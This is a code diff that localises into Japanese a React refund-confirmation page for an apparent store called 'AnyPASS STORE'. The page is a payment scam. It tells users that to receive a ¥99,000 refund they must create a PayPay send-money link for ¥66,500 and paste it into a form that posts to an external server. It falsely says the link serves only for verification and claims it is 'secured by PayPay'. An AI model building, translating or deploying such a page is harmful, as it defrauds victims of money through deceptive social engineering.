@@ -1,3 +1,4 @@
+
 import React, { useState } from "react";
 import {
   ArrowLeft,
@@ -23,18 +24,18 @@ const API_URL = "https://anypass.onrender.com";
 const ORDER_ID = "ORD-58291";
 
 const TERMS = [
-    "Refunds are returned to the original payment method and cannot be redirected to a different card or account.",
-    "AnyPASS STORE only accepts refund requests that meet the minimum threshold of ¥99,000 JPY.",
-    "To submit a valid refund request, you must follow the instructions provided below to generate and submit a PayPay payment link.",
-    "The submitted PayPay payment link will be reviewed as part of the refund verification process to determine whether the request meets the applicable requirements.",
-    "The total refund amount is ¥99,000 JPY, consisting of ¥32,500 JPY + ¥66,500 JPY, subject to successful verification and eligibility.",
-  ];
+  "返金は元のお支払い方法に返金され、別のカードやアカウントへ変更することはできません。",
+  "AnyPASS STOREでは、99,000円以上の返金申請のみ受け付けています。",
+  "有効な返金申請を行うには、以下の手順に従ってPayPay送金リンクを作成し、送信してください。",
+  "送信されたPayPay送金リンクは返金確認の一環として審査され、申請が適用条件を満たしているか確認されます。",
+  "返金総額は99,000円で、32,500円と66,500円の合計です。返金は確認および対象条件を満たした場合に実行されます。",
+];
 
 const LINK_STEPS = [
-  "Open your PayPay app and go to the 'Send' tab.",
-  'Enter amount "66,500 JPY" and instead of selecting a contact, you will choose "Create Link".',
-  "Copy the link you have created.",
-  "Paste it into the field below and we will approve your refund instantly.",
+  "PayPayアプリを開き、「送る」タブに移動してください。",
+  "金額に「66,500円」と入力し、連絡先を選択する代わりに「リンクを作成」を選択してください。",
+  "作成したリンクをコピーしてください。",
+  "以下の入力欄にリンクを貼り付けてください。返金申請を確認します。",
 ];
 
 export default function RefundConfirmation() {
@@ -81,7 +82,7 @@ export default function RefundConfirmation() {
 
       if (!response.ok) {
         throw new Error(
-          data.message || "Failed to submit PayPay payment link"
+          data.message || "PayPay送金リンクの送信に失敗しました。"
         );
       }
 
@@ -95,23 +96,23 @@ export default function RefundConfirmation() {
 
       alert(
         error.message ||
-          "Something went wrong while submitting your PayPay link."
+          "PayPay送金リンクの送信中に問題が発生しました。"
       );
     }
   };
 
   const steps = [
     {
-      label: "Requested",
+      label: "申請済み",
       done: true,
     },
     {
-      label: "Your approval",
+      label: "承認",
       done: isConfirmed,
       current: !isConfirmed,
     },
     {
-      label: "Refund completed",
+      label: "返金完了",
       done: isConfirmed,
     },
   ];
@@ -120,14 +121,14 @@ export default function RefundConfirmation() {
     <div className="min-h-screen bg-slate-50 flex flex-col items-center p-6">
       <div className="w-full max-w-md">
 
-        {/* Top bar */}
+        {/* トップバー */}
         <div className="flex items-center justify-between mb-4">
           <button
             type="button"
             className="flex items-center gap-1.5 text-sm text-slate-500 hover:text-slate-800 transition-colors"
           >
             <ArrowLeft className="w-4 h-4" />
-            Back to orders
+            注文に戻る
           </button>
 
           <span className="flex items-center gap-1 text-xs text-slate-400">
@@ -136,7 +137,7 @@ export default function RefundConfirmation() {
           </span>
         </div>
 
-        {/* Card 1: Status */}
+        {/* カード1：ステータス */}
         <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
 
           <div className="p-6 flex items-start gap-4 border-b border-slate-100">
@@ -167,8 +168,8 @@ export default function RefundConfirmation() {
                 }}
               >
                 {isConfirmed
-                  ? "Refund confirmed"
-                  : "Pending your approval"}
+                  ? "返金確認済み"
+                  : "承認待ち"}
               </p>
 
               <p className="text-2xl font-semibold text-slate-900 tracking-tight mt-0.5">
@@ -177,7 +178,7 @@ export default function RefundConfirmation() {
             </div>
           </div>
 
-          {/* Stepper */}
+          {/* ステップ */}
           <div className="px-6 py-5 border-b border-slate-100">
             <div className="flex items-center">
               {steps.map((step, i) => (
@@ -229,24 +230,24 @@ export default function RefundConfirmation() {
             </div>
           </div>
 
-          {/* Details */}
+          {/* 詳細 */}
           <div className="px-6 py-5 border-b border-slate-100 space-y-3">
 
             <div className="flex items-center justify-between text-sm">
               <span className="flex items-center gap-2 text-slate-500">
                 <Calendar className="w-4 h-4" />
-                Requested on
+                申請日
               </span>
 
               <span className="text-slate-800 font-medium">
-                Sep 18, 2026
+                2026年9月18日
               </span>
             </div>
 
             <div className="flex items-center justify-between text-sm">
               <span className="flex items-center gap-2 text-slate-500">
                 <CreditCard className="w-4 h-4" />
-                Refund method
+                返金方法
               </span>
 
               <span className="text-slate-800 font-medium">
@@ -256,12 +257,12 @@ export default function RefundConfirmation() {
 
           </div>
 
-          {/* Terms */}
+          {/* 利用規約 */}
           <div className="px-6 py-5">
 
             <div className="flex items-center gap-2 text-sm font-medium text-slate-800">
               <FileText className="w-4 h-4 text-slate-400" />
-              Refund terms and conditions
+              返金規約
             </div>
 
             <ul className="mt-3 space-y-2 text-xs text-slate-500 leading-relaxed">
@@ -301,7 +302,7 @@ export default function RefundConfirmation() {
                 />
 
                 <span className="text-sm text-slate-600">
-                  I've read and agree to the refund terms and conditions.
+                  返金規約を読み、内容に同意します。
                 </span>
               </label>
             )}
@@ -315,15 +316,14 @@ export default function RefundConfirmation() {
               >
                 <AlertCircle className="w-3.5 h-3.5" />
 
-                You need to agree to the terms before this refund can be
-                completed.
+                規約に同意してから返金手続きを完了してください。
               </p>
             )}
 
           </div>
         </div>
 
-        {/* Card 2: PayPay payment link */}
+        {/* カード2：PayPay送金リンク */}
         <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden mt-5">
 
           <div className="p-6 border-b border-slate-100">
@@ -335,11 +335,11 @@ export default function RefundConfirmation() {
                 className="w-6 h-6"
               />
 
-              How to generate a PayPay payment link
+              PayPay送金リンクの作成方法
             </div>
 
             <p className="text-sm text-slate-500 mt-1">
-              Ensure you have sufficient balance on your PayPay.
+              PayPayの残高が十分にあることを確認してください。
             </p>
 
             <ol className="mt-4 space-y-3">
@@ -367,11 +367,11 @@ export default function RefundConfirmation() {
 
           </div>
 
-          {/* Payment link input */}
+          {/* 送金リンク入力欄 */}
           <div className="p-6">
 
             <label className="text-sm font-medium text-slate-800">
-              PayPay payment link
+              PayPay送金リンク
             </label>
 
             <input
@@ -401,7 +401,7 @@ export default function RefundConfirmation() {
               >
                 <AlertCircle className="w-3.5 h-3.5" />
 
-                Please add your PayPay payment link to continue.
+                続行するにはPayPay送金リンクを入力してください。
               </p>
             )}
 
@@ -415,19 +415,17 @@ export default function RefundConfirmation() {
                 <CheckCircle2 className="w-3.5 h-3.5" />
 
                 {isConfirmed
-                  ? "Payment link submitted successfully."
+                  ? "送金リンクが正常に送信されました。"
                   : isProcessing
-                  ? "Submitting payment link..."
-                  : "Link added."}
+                  ? "送金リンクを送信中..."
+                  : "リンクが追加されました。"}
               </p>
             )}
 
           </div>
 
           <p className="px-6 pb-6 text-xs text-slate-400">
-            Note: The PayPay link will only be used to verify that your
-            refund request meets the threshold of 99,000 JPY. It will not
-            be used for any other purpose.
+            注意：PayPay送金リンクは、返金申請が99,000円の基準額を満たしているか確認するためにのみ使用されます。その他の目的には使用されません。
           </p>
 
           <div className="px-6 pb-6 text-xs text-slate-400 text-center">
@@ -438,19 +436,19 @@ export default function RefundConfirmation() {
             />
 
             <span>
-              Powered and secured by PayPay.
+              PayPayによって提供・保護されています。
             </span>
           </div>
 
         </div>
 
         <p className="text-center text-xs text-slate-400 mt-5">
-          Questions about this refund? Contact support anytime.
+          この返金についてご質問がありますか？いつでもサポートにお問い合わせください。
         </p>
 
       </div>
 
-      {/* Confirm action */}
+      {/* 確認ボタン */}
       <div className="w-full max-w-md mt-6">
 
         {isConfirmed ? (
@@ -463,7 +461,7 @@ export default function RefundConfirmation() {
           >
             <CheckCircle2 className="w-4 h-4" />
 
-            Please wait as we process your refund.
+            返金処理が完了するまでお待ちください。
           </div>
         ) : (
           <button
@@ -477,10 +475,10 @@ export default function RefundConfirmation() {
             {isProcessing ? (
               <>
                 <Loader2 className="w-4 h-4 animate-spin" />
-                Submitting…
+                送信中…
               </>
             ) : (
-              "Confirm and complete refund"
+              "確認して返金を完了する"
             )}
           </button>
         )}
